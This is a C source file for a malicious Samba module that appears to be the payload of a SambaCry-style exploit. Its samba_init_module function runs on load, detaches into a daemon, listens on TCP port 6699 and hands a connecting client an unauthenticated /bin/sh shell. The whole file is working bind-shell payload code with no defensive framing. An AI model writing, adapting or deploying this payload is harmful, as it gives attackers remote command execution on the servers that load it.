#include <stdio.h>
#include <stdlib.h>

#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>

#include <unistd.h>

#define EXIT_SUCCESS 0
#define EXIT_FAILURE 1

static void detachFromParent(void) {
    pid_t pid, sid;

    // Are we a Daemon ?
    if ( getppid() == 1 ){
        return;
    }

    // Fork from the parent
    pid = fork();
    // Bad PID ?
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    
    // Our PID is OK, but we will exit if this is the parent process
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    // And continue this execution if we were the child process

    // Change our umask
    umask(0);

    // Create a new SID
    // Ref: http://man7.org/linux/man-pages/man2/setsid.2.html
    sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
    }

    // Let's move to / an directory that will always exist !
    if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }

}


int samba_init_module(void){
    // Detach from Samba process, now we can work
    detachFromParent();

    // Data structures for our socket
    int hostSocket;
    int clientSocket;
    struct sockaddr_in hostAddr;

    // Socket creation
    hostSocket = socket(PF_INET, SOCK_STREAM, 0);

    // Initialize sockAddr
    hostAddr.sin_family = AF_INET;
    hostAddr.sin_port = htons(6699);
    hostAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind our socket 
    bind(hostSocket, (struct sockaddr*) &hostAddr, sizeof(hostAddr));
    
    // Listen for our client to serve the shell
    listen(hostSocket, 2);

    // Wait until we got an client
    clientSocket = accept(hostSocket, NULL, NULL);

    // Dup2 our stdin, stderr and stdout
    dup2(clientSocket, 0);
    dup2(clientSocket, 1);
    dup2(clientSocket, 2);

    // Spawn /bin/sh
    execve("/bin/sh", NULL, NULL);
    close(hostSocket);

    return 0;
}
